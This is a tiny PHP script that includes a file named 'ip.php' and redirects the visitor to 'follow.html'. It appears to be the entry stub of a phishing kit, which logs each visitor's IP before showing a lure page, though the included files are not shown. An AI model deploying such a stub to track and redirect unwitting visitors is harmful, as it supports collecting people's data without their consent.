<?php
include 'ip.php';
header('Location: follow.html');
exit
?>
